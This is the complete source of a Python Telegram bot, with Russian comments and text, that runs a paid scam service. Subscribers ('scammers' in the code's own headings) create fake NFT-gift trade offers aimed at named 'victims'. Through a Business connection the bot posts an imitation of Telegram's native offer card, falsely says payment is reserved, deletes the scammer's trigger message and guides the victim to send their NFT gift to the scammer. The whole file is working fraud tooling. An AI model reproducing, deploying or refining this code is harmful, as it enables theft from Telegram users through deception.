import os
import re
import uuid
import asyncio
import logging
import sys
import random
import string
from aiogram import Bot, Dispatcher, F, Router
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode
from aiogram.filters import Command
from aiogram.types import (Message, CallbackQuery, InlineKeyboardButton,
                           InlineKeyboardMarkup, BusinessConnection)
from dotenv import load_dotenv

load_dotenv()
logging.basicConfig(level=logging.INFO, stream=sys.stdout)
log = logging.getLogger("offerbot")

BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID = int(os.getenv("ADMIN_ID", "0"))
DEFAULT_RECEIVER = os.getenv("RECEIVER_USERNAME", "vo1d_root")

bot = Bot(BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp = Dispatcher()
router = Router()
dp.include_router(router)

OFFERS = {}
USERS = {}  # user_id: {"subscribed": bool, "my_username": str, "receiver": str}
KEYS = set()

# Генерация 100 ключей
for _ in range(100):
    key = "TG-" + "".join(random.choices(string.ascii_uppercase + string.digits, k=6))
    KEYS.add(key)

NFT_RE = re.compile(r"https?://t\.me/nft/([A-Za-z0-9_-]+)", re.I)
PRICE_RE = re.compile(r"(\d+)\s*(gram|грам|звезд|star|stars|⭐|grams)", re.I)
CODE_RE = re.compile(r"(of_[a-f0-9]{5})", re.I)
KEY_RE = re.compile(r"^(TG-[A-Z0-9]{6})$", re.I)

def parse_nft(url: str):
    m = NFT_RE.search(url)
    if not m: return None
    slug_raw = m.group(1)
    parts = slug_raw.rsplit("-", 1)
    name_raw, num = (parts[0], parts[1]) if len(parts) == 2 and parts[1].isdigit() else (slug_raw, "")
    display = re.sub(r"(?<!^)(?=[A-Z])", " ", name_raw).strip()
    return {"slug": slug_raw, "name": f"{display} #{num}" if num else display}

def parse_price(text: str):
    m = PRICE_RE.search(text)
    if not m: return None
    amount, unit = m.group(1), m.group(2).lower()
    if unit in ("gram", "грам", "grams"): return (amount, "Gram")
    return (amount, "Stars")

# ==========================================
# МЕНЮ КЛИЕНТА (СКАМЕРА)
# ==========================================
async def show_client_menu(msg_or_cb):
    text = (
        "👑 <b>Панель управления</b>\n\n"
        "<b>Как запустить оффер:</b>\n"
        "1. Создайте оффер командой:\n"
        "<code>/offer [ссылка_на_подарок] [цена] [@username_жертвы]</code>\n"
        "Пример: <code>/offer https://t.me/nft/MirageLamp-73768 1500 stars @target</code>\n\n"
        "2. Бот выдаст вам код <code>of_...</code>.\n"
        "3. Скопируйте код и отправьте его в чат с жертвой.\n\n"
        "<b>Настройки:</b> чтобы изменить свой юзернейм в оффере (сейчас <b>@" + USERS.get(msg_or_cb.from_user.id, {}).get("my_username", DEFAULT_RECEIVER) + "</b>), напишите <code>/setuser @ваш_ник</code>"
    )
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📖 Инструкция", callback_data="client_help")],
        [InlineKeyboardButton(text="⚙️ Изменить юзернейм", callback_data="client_settings")]
    ])
    
    if isinstance(msg_or_cb, Message):
        await msg_or_cb.reply(text, reply_markup=kb)
    else:
        await msg_or_cb.message.edit_text(text, reply_markup=kb)

# ==========================================
# СТАРТ
# ==========================================
@router.message(Command("start"))
async def cmd_start(msg: Message):
    # Твоя админка (владелец)
    if msg.from_user.id == ADMIN_ID:
        await msg.reply(
            "👑 <b>Глобальная Админ-панель:</b>\n\n"
            "/keys — список ключей\n"
            "/set_default @ник — сменить дефолтного получателя\n"
            "/stats — статистика"
        )
        return
    
    uid = msg.from_user.id
    if uid not in USERS:
        USERS[uid] = {"subscribed": False, "my_username": DEFAULT_RECEIVER, "receiver": DEFAULT_RECEIVER}
    
    if USERS[uid]["subscribed"]:
        await show_client_menu(msg)
        return

    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Оплатить (50 ⭐️)", url=f"https://t.me/{DEFAULT_RECEIVER}")],
        [InlineKeyboardButton(text="Ввести ключ", callback_data="enter_key")]
    ])
    await msg.reply(
        "👋 <b>Для доступа к панели нужна подписка.</b>\n\n"
        f"1. Перейдите к <b>@{DEFAULT_RECEIVER}</b> (кнопка ниже)\n"
        f"2. Отправьте подарок за <b>50 ⭐️</b>\n"
        f"3. Нажмите «Ввести ключ» и введите полученный код.\n\n"
        "Подписка активируется навсегда.",
        reply_markup=kb
    )

# ==========================================
# ОБРАБОТЧИКИ КНОПОК КЛИЕНТА
# ==========================================
@router.callback_query(F.data == "client_help")
async def cb_client_help(cb: CallbackQuery):
    text = (
        "<b>📖 Инструкция</b>\n\n"
        "1. В личке бота напишите <code>/offer [ссылка] [цена] @юзер</code>.\n"
        "2. Получите код <code>of_...</code>.\n"
        "3. Отправьте код в чат с жертвой.\n"
        "4. Жертва нажмет «Принять» и получит нативное меню Telegram.\n\n"
        "Бот сам удалит ваш код из чата и отправит карточку."
    )
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="⬅️ Назад", callback_data="client_back")]
    ])
    await cb.message.edit_text(text, reply_markup=kb)
    await cb.answer()

@router.callback_query(F.data == "client_settings")
async def cb_client_settings(cb: CallbackQuery):
    uid = cb.from_user.id
    curr = USERS.get(uid, {}).get("my_username", DEFAULT_RECEIVER)
    text = (
        f"<b>⚙️ Настройки</b>\n\n"
        f"Сейчас в офферах пишется: <b>@{curr}</b>\n\n"
        f"Чтобы изменить, отправьте:\n"
        f"<code>/setuser @ваш_ник</code>"
    )
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="⬅️ Назад", callback_data="client_back")]
    ])
    await cb.message.edit_text(text, reply_markup=kb)
    await cb.answer()

@router.callback_query(F.data == "client_back")
async def cb_client_back(cb: CallbackQuery):
    await show_client_menu(cb)
    await cb.answer()

# ==========================================
# КОМАНДЫ КЛИЕНТА
# ==========================================
@router.message(Command("setuser"))
async def cmd_setuser(msg: Message):
    uid = msg.from_user.id
    if not USERS.get(uid, {}).get("subscribed"):
        await msg.reply("❌ Сначала активируйте подписку.")
        return
    
    parts = msg.text.split()
    if len(parts) < 2 or not parts[1].startswith("@"):
        await msg.reply("❌ Формат: <code>/setuser @ваш_ник</code>")
        return
    
    new_rec = parts[1].replace("@", "").strip()
    USERS[uid]["my_username"] = new_rec
    USERS[uid]["receiver"] = new_rec # Теперь подарки летят на его ник
    await msg.reply(f"✅ Юзернейм в офферах изменен на <b>@{new_rec}</b>.")

# ==========================================
# СОЗДАНИЕ ОФФЕРА (КЛИЕНТ)
# ==========================================
@router.message(F.text.regexp(r"^/offer\s+"))
async def cmd_offer(msg: Message):
    uid = msg.from_user.id
    if not USERS.get(uid, {}).get("subscribed"):
        await msg.reply("❌ Нет подписки. Напишите /start.")
        return

    parts = msg.text.replace("/offer", "").strip().split()
    if len(parts) < 3:
        await msg.reply("❌ Формат: <code>/offer [ссылка] [цена] [@username]</code>")
        return

    url = parts[0]
    target_user = parts[-1] if parts[-1].startswith("@") else "unknown"
    price_text = " ".join(parts[1:-1])
    nft = parse_nft(url)
    price_data = parse_price(price_text)

    if not nft or not price_data:
        await msg.reply("❌ Не понял ссылку или цену.")
        return

    oid = "of_" + uuid.uuid4().hex[:5]
    # Сохраняем кто создал оффер, чтобы принять правильный ник
    OFFERS[oid] = {
        "nft_name": nft["name"], "nft_slug": nft["slug"],
        "price_amount": price_data[0], "price_currency": price_data[1],
        "buyer_id": uid, # Запоминаем создателя оффера
        "buyer_username": USERS[uid]["my_username"], # Его текущий ник
        "target_user": target_user
    }
    await msg.reply(f"✅ Оффер <code>{oid}</code> создан.\n\nОтправьте этот код в чат с жертвой.")

# ==========================================
# АДМИНКА ВЛАДЕЛЬЦА (ТЫ)
# ==========================================
@router.message(Command("keys"))
async def cmd_keys(msg: Message):
    if msg.from_user.id != ADMIN_ID: return
    keys_list = "\n".join(list(KEYS)[:20])
    await msg.reply(f"<b>Осталось ключей ({len(KEYS)}):</b>\n<code>{keys_list}</code>\n... и еще {max(0, len(KEYS)-20)}")

@router.message(F.text.regexp(r"^/set_default\s+"))
async def cmd_set_default(msg: Message):
    if msg.from_user.id != ADMIN_ID: return
    global DEFAULT_RECEIVER
    new_rec = msg.text.replace("/set_default", "").strip().replace("@", "")
    DEFAULT_RECEIVER = new_rec
    await msg.reply(f"✅ Дефолтный получатель изменен на @{new_rec}")

# ==========================================
# АКТИВАЦИЯ КЛЮЧА
# ==========================================
@router.callback_query(F.data == "enter_key")
async def on_enter_key(cb: CallbackQuery):
    await cb.message.reply("Отправьте ваш ключ доступа (например, TG-XXXXXX).")
    await cb.answer()

@router.message(F.text.regexp(KEY_RE))
async def check_key(msg: Message):
    uid = msg.from_user.id
    key = msg.text.strip().upper()
    if key in KEYS:
        KEYS.remove(key)
        if uid not in USERS: USERS[uid] = {}
        USERS[uid]["subscribed"] = True
        USERS[uid]["my_username"] = DEFAULT_RECEIVER
        USERS[uid]["receiver"] = DEFAULT_RECEIVER
        
        await msg.reply("✅ Ключ активирован! Добро пожаловать.")
        await show_client_menu(msg)
    else:
        await msg.reply("❌ Неверный или уже использованный ключ.")

# ==========================================
# ОТПРАВКА В БИЗНЕС-ЧАТ
# ==========================================
@router.business_message(F.text)
async def handle_business_message(msg: Message):
    m = CODE_RE.search(msg.text)
    if not m: return

    oid = m.group(1).lower()
    offer = OFFERS.get(oid)
    if not offer: return

    # Проверяем, что код в чат кинул именно создатель оффера
    if msg.from_user.id != offer["buyer_id"]:
        return

    conn_id = msg.business_connection_id
    if not conn_id: return

    price_str = f"{offer['price_amount']} ⭐️" if offer["price_currency"] == "Stars" else f"{offer['price_amount']} Gram"
    # Берем ник того, кто создал оффер
    target_user = offer["buyer_username"] 
    
    nft_link = f'<a href="https://t.me/nft/{offer["nft_slug"]}">{offer["nft_name"]}</a>'

    card_text = (
        f"Пользователь <b>{target_user}</b> предлагает обменять ваш {nft_link} на <b>{price_str}</b>.\n\n"
        f"Вы согласны принять предложение?\n\n"
        f"Предложение действует ещё <b>6ч 0м</b>.\n\n"
        f"{nft_link}"
    )

    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Отклонить", callback_data=f"reject:{oid}"),
         InlineKeyboardButton(text="Принять", callback_data=f"accept1:{oid}")]
    ])
    
    try:
        await bot.send_message(
            chat_id=msg.chat.id, text=card_text, business_connection_id=conn_id,
            reply_markup=kb, disable_web_page_preview=False
        )
        await asyncio.sleep(2)
        try: await bot.delete_message(chat_id=msg.chat.id, message_id=msg.message_id)
        except: pass
    except Exception as e:
        log.error(f"❌ Ошибка: {e}")

# ==========================================
# ЛОГИКА ОФФЕРА
# ==========================================
@router.callback_query(F.data.startswith("accept1:"))
async def on_accept1(cb: CallbackQuery):
    oid = cb.data.split(":", 1)[1]
    offer = OFFERS.get(oid)
    if not offer: return
    
    price_str = f"{offer['price_amount']} ⭐️" if offer["price_currency"] == "Stars" else f"{offer['price_amount']} Gram"
    text = f"<b>Сумма {price_str} зарезервирована.</b>\n\nЧтобы завершить сделку:\n1. Ознакомьтесь с инструкцией.\n2. Нажмите «Передать NFT»."
    
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Передать NFT", callback_data=f"accept2:{oid}")]
    ])
    await cb.message.edit_text(text=text, reply_markup=kb)
    await cb.answer()

@router.callback_query(F.data.startswith("accept2:"))
async def on_accept2(cb: CallbackQuery):
    oid = cb.data.split(":", 1)[1]
    offer = OFFERS.get(oid)
    native_url = f"tg://send_gift?slug={offer['nft_slug']}"
    
    # Берем получателя из профиля создателя оффера
    receiver = offer["buyer_username"]
    
    text = (
        f"<b>Инструкция по передаче:</b>\n\n"
        f"1. Нажмите на кнопку ниже\n"
        f"2. Выберите «Передать NFT»\n"
        f"3. Укажите получателя: <b>@{receiver}</b>\n"
        f"4. Подтвердите.\n\n"
        f"👇 Меню передачи откроется автоматически:"
    )
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Передать NFT ↗", url=native_url)]
    ])
    await cb.message.edit_text(text=text, reply_markup=kb)
    await cb.answer()

@router.callback_query(F.data.startswith("reject:"))
async def on_reject(cb: CallbackQuery):
    try: await cb.message.edit_reply_markup(reply_markup=None)
    except: pass
    await cb.answer("Вы отклонили предложение.")

@router.business_connection()
async def on_business_conn(conn: BusinessConnection):
    log.info(f"✅ Business connection: user={conn.user.id} id={conn.id}")

async def main():
    log.info("Starting bot...")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
